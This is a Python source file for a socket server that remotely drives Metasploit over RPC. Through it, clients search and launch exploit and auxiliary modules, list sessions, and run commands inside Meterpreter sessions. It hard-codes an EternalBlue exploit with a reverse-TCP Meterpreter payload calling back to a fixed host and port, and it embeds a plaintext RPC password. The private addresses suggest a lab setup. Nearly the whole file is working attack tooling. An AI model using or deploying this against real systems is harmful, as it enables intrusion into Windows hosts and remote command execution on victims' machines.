import os
import time
import socket
import threading
import subprocess
from socket_threading import Server
import json
from pymetasploit3.msfrpc import MsfRpcClient

from socket_threading import RED, BLUE, GREEN, YELLOW, RESET

MSF_HOST = "10.1.1.2"
MSF_PORT = 1337
MSF_PASSWORD = "memes"
RESOURCE_SCRIPT = "/usr/src/metasploit-framework/docker/msfconsole.rc"

msfInstance = None

def run_meterpreter_exploit(target_ip):
    """Execute a Meterpreter payload against the target (hard-coded)."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"

    exploit = msfInstance.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
    if not exploit:
        return f"{RED}[!] Failed to load exploit module{RESET}"

    exploit["RHOSTS"] = target_ip
    exploit.payload = "windows/x64/meterpreter/reverse_tcp"
    exploit.payload["LHOST"] = "10.1.1.2"
    exploit.payload["LPORT"] = 4444

    job_id = exploit.execute()
    return f"{GREEN}[+] Meterpreter exploit launched with job ID {job_id}{RESET}"

def monitor_meterpreter_sessions():
    """Monitor for new Meterpreter sessions."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    while True:
        sessions = msfInstance.sessions.list
        if sessions:
            for sid, session in sessions.items():
                print(f"{GREEN}[+] Meterpreter session {sid} detected ({session['type']}){RESET}")
        time.sleep(5)

def interact_meterpreter(session_id, command):
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    session = msfInstance.sessions.session(session_id)
    if not session:
        return f"{RED}[!] Session ID {session_id} not found.{RESET}"
    
    if session['type'] != 'meterpreter':
        return f"{RED}[!] Session {session_id} is a {session['type']} session, not Meterpreter.{RESET}"

    try:
        output = session.run_with_output(command)
        return f"{GREEN}{output}{RESET}"
    except Exception as e:
        return f"{RED}[!] Error in Meterpreter command: {e}{RESET}"
    
def connect_to_msfserver(password, server, port, max_retries=10, retry_delay=2):
    """Connect to the MSF server with retries."""
    print(f"{GREEN}=============== Starting Metasploit API ==============={RESET}")
    for attempt in range(max_retries):
        try:
            msf_client = MsfRpcClient(password, server=server, port=port)
            print(f"{GREEN}[+] Successfully connected to MSF Server!{RESET}")
            return msf_client
        except Exception as e:
            print(f"{YELLOW}[!] Failed to connect to MSF Server: {e}, RETRYING ({attempt + 1}/{max_retries}){RESET}")
            time.sleep(retry_delay)
    print(f"{RED}[!] Max retries reached. Could not connect to MSF Server.{RESET}")
    return None

def start_msfconsole_with_script(resource_script):
    """Start msfconsole with the specified resource script."""
    if not os.path.exists(resource_script):
        print(f"{RED}[!] Resource script {resource_script} not found!{RESET}")
        return False
    
    print(f"{GREEN}[+] Starting msfconsole with resource script: {resource_script}{RESET}")
    try:
        process = subprocess.Popen(
            ["msfconsole", "-r", resource_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(5)
        if process.poll() is not None:
            stdout, stderr = process.communicate()
            print(f"{RED}[!] msfconsole failed to start: {stderr}{RESET}")
            return False
        print(f"{GREEN}[+] msfconsole started successfully! PID: {process.pid}{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[!] Error starting msfconsole: {e}{RESET}")
        return False

def start_session_monitor():
    """Start a thread to monitor Meterpreter sessions."""
    monitor_thread = threading.Thread(target=monitor_meterpreter_sessions)
    monitor_thread.daemon = True
    monitor_thread.start()

def connect_msf():
    """Start msfconsole, then connect via RPC, then monitor sessions."""
    if not start_msfconsole_with_script(RESOURCE_SCRIPT):
        return None
    msf_instance = connect_to_msfserver(password=MSF_PASSWORD, server=MSF_HOST, port=MSF_PORT)
    if msf_instance:
        print(f"{GREEN}[+] Registered Metasploit with name 'msf'{RESET}")
        global msfInstance
        msfInstance = msf_instance
        start_session_monitor()  
    else:
        print(f"{RED}[!] Failed to register Metasploit.{RESET}")
    return msf_instance

def search_exploit(keyword=None, start=0, count=20):
    """Search for exploits, numbering results with pagination."""
    if msfInstance is None:
        return [], 0
    exploits = msfInstance.modules.exploits
    if not keyword:
        filtered_exploits = exploits
    else:
        filtered_exploits = [e for e in exploits if keyword.lower() in e.lower()]
    total = len(filtered_exploits)
    paginated = filtered_exploits[start:start + count]
    numbered = [f"{i + 1 + start}. {e}" for i, e in enumerate(paginated)]
    if start + count < total:
        numbered.append(f"{BLUE}[SERVER] Send 'next'/'prev' or 'exit'{RESET}")
    return numbered, total

def search_auxiliary_modules(keyword=None, start=0, count=20):
    """Search for auxiliary modules with pagination."""
    if msfInstance is None:
        return [], 0
    aux = msfInstance.modules.auxiliary
    if not keyword:
        filtered_aux = aux
    else:
        filtered_aux = [a for a in aux if keyword.lower() in a.lower()]
    total = len(filtered_aux)
    paginated_aux = filtered_aux[start:start + count]
    return paginated_aux, total

def parse_param_value(opt_data, user_input):
    """
    Convert 'user_input' to correct type based on 'opt_data'.
    If 'user_input' is empty -> return None to rely on Metasploit defaults.
    """
    if user_input is None:
        # If user pressed enter or something, fallback
        return None

    user_input = user_input.strip()
    if not user_input:
        return None

    msf_type = opt_data.get('type', '').lower()
    default_val = opt_data.get('default', None)

    if msf_type == 'bool' or isinstance(default_val, bool):
        return (user_input.lower() == 'true')
    elif msf_type == 'integer' or isinstance(default_val, int):
        return int(user_input)
    elif msf_type == 'port':
        return int(user_input)
    return user_input

def validate_payload(exploit_module, payload_name):
    """Check if payload is compatible with the exploit."""
    try:
        if payload_name not in exploit_module.payloads:
            return False, f"{RED}Payload {payload_name} not compatible with {exploit_module.name}{RESET}"
        return True, None
    except Exception as e:
        return False, f"{RED}Error validating payload: {e}{RESET}"

def run_msf_exploit(mtype, mname, user_params):
    """Execute the module with user_params."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    exploit = msfInstance.modules.use(mtype, mname)
    if not exploit:
        return f"{RED}[!] Could not load {mtype} module: {mname}{RESET}"

    # If exploit, set payload first
    if mtype == "exploit" and "PAYLOAD" in user_params:
        try:
            exploit.payload = user_params["PAYLOAD"]
        except Exception as e:
            return f"{RED}[!] Invalid payload: {e}{RESET}"

    # Now set exploit (and payload) options
    for key, val in user_params.items():
        # skip payload itself in the exploit options
        if key == "PAYLOAD":
            continue
        # if the exploit or its payload define this, set it
        if key in exploit.options:
            exploit[key] = val
        # if there's a payload set, try to set payload params
        if exploit.payload and hasattr(exploit.payload, 'options'):
            if key in exploit.payload.options:
                exploit.payload[key] = val

    print(f"{GREEN}Running {mtype}: {mname}{RESET}")
    result = exploit.execute()
    print(f"{BLUE}Result: {result}{RESET}")
    return result

def validate_module_type(module_type, module_name):
    """Check if the specified module_name is in exploits or auxiliary."""
    if msfInstance is None:
        return False, f"{RED}[-] Not connected to Metasploit.{RESET}"
    if module_type == "exploit":
        if module_name not in msfInstance.modules.exploits:
            return False, f"{RED}{module_name} is NOT an exploit. Try: run auxiliary {module_name}{RESET}"
    elif module_type == "auxiliary":
        if module_name not in msfInstance.modules.auxiliary:
            return False, f"{RED}{module_name} is NOT an auxiliary. Try: run exploit {module_name}{RESET}"
    return True, None

def handle_message(data, client_address):
    """Main message handler."""
    global msfInstance
    print(f"{BLUE}[Server] Processing message: '{data}' from {client_address}{RESET}")

    parts = data.split(maxsplit=2)
    if not parts:
        return f"{RED}Invalid command.{RESET}"

    command = parts[0].lower()

    # We track user state in handle_message.search_state
    if not hasattr(handle_message, 'search_state'):
        handle_message.search_state = {}
    client_state = handle_message.search_state.setdefault(
        client_address,
        {'keyword': None, 'start': 0, 'in_search': False, 'in_run': False, 
         'run_module': None, 'exploit_options': [], 'user_params': {}, 
         'module_type': None, 'module_name': None}
    )

    if command == "connect":
        response = f"{BLUE}[+] Connecting to MSF...{RESET}"
        msf = connect_msf()
        if msf:
            response = f"{BLUE}[+] Connected to Metasploit!{RESET}"
        else:
            response = f"{RED}[-] Failed to connect to Metasploit{RESET}"
        client_state['in_search'] = False
        client_state['in_run'] = False

    elif command == "search":
        if len(parts) < 3:
            response = f"{RED}[!] Usage: search [exploits|auxiliary] <keyword> [start_index]{RESET}"
        else:
            module_type = parts[1]
            # keyword might be the second or we might have more text
            if len(parts) == 3:
                # everything after is the keyword
                keyword = parts[2]
                start_idx = 0
            else:
                # we have possibly an integer as the next param
                # but we used maxsplit=2, so we only have parts[2] as leftover
                # parse it out if needed
                pass

            if msfInstance is None:
                response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
            else:
                start_idx = 0
                # see if the user typed something like: "search exploit vsftpd 20"
                # we can parse the last part for an int
                tokens = parts[2].split()
                keyword = tokens[0]
                if len(tokens) > 1 and tokens[-1].isdigit():
                    start_idx = int(tokens[-1])
                    keyword = ' '.join(tokens[:-1])

                if module_type == "exploits":
                    client_state['keyword'] = keyword
                    client_state['start'] = start_idx
                    client_state['in_search'] = True
                    results, total = search_exploit(keyword, start_idx)
                    if results:
                        response = f"{BLUE}Exploit modules matching '{keyword}' ({start_idx}-{min(start_idx+20, total)} of {total}):\n{RESET}" + "\n".join(results)
                    else:
                        response = f"{BLUE}No exploit modules found for '{keyword}'.{RESET}"
                elif module_type == "auxiliary":
                    client_state['keyword'] = keyword
                    client_state['start'] = start_idx
                    client_state['in_search'] = True
                    results, total = search_auxiliary_modules(keyword, start_idx)
                    if results:
                        response = f"{BLUE}Auxiliary modules matching '{keyword}' ({start_idx}-{min(start_idx+20, total)} of {total}):\n{RESET}" + "\n".join(results)
                    else:
                        response = f"{BLUE}No auxiliary modules found for '{keyword}'.{RESET}"
                else:
                    response = f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"

    elif command == "run":
        tokens = data.split()
        if len(tokens) < 3:
            response = f"{RED}[!] Usage: run [exploit|auxiliary] <module_name>{RESET}"
        else:
            module_type = tokens[1].lower()
            module_name = tokens[2]
            ok, err_msg = validate_module_type(module_type, module_name)
            if not ok:
                response = err_msg
            else:
                exploit = msfInstance.modules.use(module_type, module_name)
                if not exploit:
                    response = f"{RED}[!] Could not load {module_type} module: {module_name}{RESET}"
                else:
                    # Build a basic prompt list
                    if module_type == "exploit":
                        ALWAYS_PROMPT_OPTS = ["RHOSTS", "RPORT", "PAYLOAD", "LHOST", "LPORT"]
                    else:
                        ALWAYS_PROMPT_OPTS = ["USERNAME", "PASSWORD", "RHOSTS", "RPORT", "THREADS"]

                    exploit_info = exploit._info.get("options", {})

                    # We'll reorder so that 'PAYLOAD' is asked earlier, letting us skip LHOST if needed
                    # Step 1: ask for RHOSTS, RPORT, PAYLOAD first
                    first_pass = []
                    second_pass = []
                    for opt in ALWAYS_PROMPT_OPTS:
                        if opt in ["RHOSTS", "RPORT", "PAYLOAD"]:
                            first_pass.append(opt)
                        else:
                            second_pass.append(opt)

                    # Build final prompt list with two-phase approach
                    final_prompt_list = []
                    # 1) RHOSTS,RPORT,PAYLOAD
                    for opt_name in first_pass:
                        if (opt_name in exploit_info) or opt_name in ["PAYLOAD"]:
                            opt_data = exploit_info.get(opt_name, {"type":"string","default":None})
                            def_val = opt_data.get("default", None)
                            msg = f"Please enter {opt_name}"
                            if def_val is not None:
                                msg += f" (default: {def_val})"
                            final_prompt_list.append({
                                "name": opt_name,
                                "default": def_val,
                                "prompt": msg
                            })
                    # 2) LHOST,LPORT, or the auxiliary things
                    for opt_name in second_pass:
                        if (opt_name in exploit_info) or opt_name in ["LHOST","LPORT"]:
                            opt_data = exploit_info.get(opt_name, {"type":"string","default":None})
                            def_val = opt_data.get("default", None)
                            msg = f"Please enter {opt_name}"
                            if def_val is not None:
                                msg += f" (default: {def_val})"
                            final_prompt_list.append({
                                "name": opt_name,
                                "default": def_val,
                                "prompt": msg
                            })

                    if not final_prompt_list:
                        # no prompts needed
                        result = exploit.execute()
                        response = json.dumps(result)
                    else:
                        client_state['in_run'] = True
                        client_state['exploit_options'] = final_prompt_list
                        client_state['user_params'] = {}
                        client_state['module_type'] = module_type
                        client_state['module_name'] = module_name
                        response = f"{BLUE}{final_prompt_list[0]['prompt']}: {RESET}"
                        
    elif client_state['in_run']:
        exploit = msfInstance.modules.use(client_state['module_type'], client_state['module_name'])
        if not exploit:
            response = f"{RED}[!] Could not load {client_state['module_type']} module: {client_state['module_name']}{RESET}"
            client_state['in_run'] = False
        else:
            if not client_state['exploit_options']:
                response = f"{RED}[!] No more options to fill.{RESET}"
                client_state['in_run'] = False
            else:
                current_opt = client_state['exploit_options'][0]
                param_name = current_opt['name']

                # The user typed something for this param
                user_input = data.strip()  

                fallback_opt = {"default": None, "type": "string"}
                opt_data = exploit._info['options'].get(param_name, fallback_opt)

                parsed_value = parse_param_value(opt_data, user_input)
                client_state['user_params'][param_name] = parsed_value

                # If param_name is PAYLOAD and it's "cmd/unix/bind"/"cmd/unix/interact", remove LHOST,LPORT
                if param_name.upper() == "PAYLOAD" and parsed_value:
                    pay_lower = str(parsed_value).lower()
                    if pay_lower in ["cmd/unix/bind", "cmd/unix/interact"]:
                        client_state['exploit_options'] = [
                            o for o in client_state['exploit_options']
                            if o['name'] not in ("LHOST","LPORT") or o['name'] == param_name
                        ]

                # Move on
                client_state['exploit_options'].pop(0)
                if not client_state['exploit_options']:
                    # done => run exploit
                    result = run_msf_exploit(
                        client_state['module_type'],
                        client_state['module_name'],
                        client_state['user_params']
                    )
                    response = result if isinstance(result, str) else json.dumps(result)
                    client_state['in_run'] = False
                else:
                    nxt = client_state['exploit_options'][0]
                    response = f"{BLUE}{nxt['prompt']}: {RESET}"


    elif command in ["next","prev"] and client_state['in_search']:
        if msfInstance is None:
            response = f"{RED}[-] Not connected. Use 'connect' first.{RESET}"
        else:
            if command == "next":
                client_state['start'] += 20
            else:
                client_state['start'] -= 20
            results, total = search_exploit(client_state['keyword'], client_state['start'])
            if results:
                response = f"{BLUE}Exploit modules matching '{client_state['keyword']}' ({client_state['start']}-{min(client_state['start']+20, total)} of {total}):\n{RESET}"+"\n".join(results)
            else:
                response = f"{BLUE}No more exploit modules available.{RESET}"

    elif command == "exit" and client_state['in_search']:
        client_state['in_search'] = False
        client_state['keyword'] = None
        client_state['start'] = 0
        response = f"{BLUE}Returned to normal CLI.{RESET}"

    elif command == "sessions":
        if msfInstance is None:
            response = f"{RED}[-] Not connected to Metasploit.{RESET}"
        else:
            sessions = msfInstance.sessions.list
            if sessions:
                lines = []
                for sid, sdata in sessions.items():
                    stype = sdata['type']
                    tpeer = sdata['tunnel_peer']
                    if stype=="meterpreter":
                        lines.append(f"{GREEN}ID: {sid}, Type: {stype}, Target: {tpeer}{RESET}")
                    else:
                        lines.append(f"ID: {sid}, Type: {stype}, Target: {tpeer}")
                response = "Active Sessions:\n" + "\n".join(lines)
            else:
                response = f"{RED}No active sessions found.{RESET}"

    elif command.startswith("meterpreter"):
        # usage: meterpreter <session_id> <cmd...>
        tokens = data.split(maxsplit=2)
        if len(tokens) < 3:
            response = f"{RED}Usage: meterpreter <session_id> <command>{RESET}"
        else:
            sid = tokens[1]
            cmd_line = tokens[2]
            try:
                session = msfInstance.sessions.session(sid)
                if session['type']!="meterpreter":
                    response = f"{RED}Session {sid} is {session['type']}, not meterpreter.{RESET}"
                else:
                    out = session.run_with_output(cmd_line)
                    response = f"{GREEN}{out}{RESET}"
            except KeyError:
                response = f"{RED}Session ID {sid} does not exist.{RESET}"

    elif command=="jobs":
        if msfInstance is None:
            response = f"{RED}[-] Not connected to Metasploit.{RESET}"
        else:
            jobs = msfInstance.jobs.list
            if jobs:
                lines = []
                for jid, jdata in jobs.items():
                    lines.append(f"ID: {jid}, Name: {jdata['name']}")
                joined_lines = "\n".join(lines)
                response = f"{GREEN}Active Jobs:\n{joined_lines}{RESET}"
            else:
                response = f"{RED}No active jobs.{RESET}"

    else:
        response = f"{RED}Invalid command or not in search mode.{RESET}"

    print(f"{BLUE}[Server] Sending response to {client_address}: {response}{RESET}")
    return response

def main():
    server = Server(host='10.1.1.2', port=4444, message_handler=handle_message)
    server.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.exit()

if __name__ == "__main__":
    main()
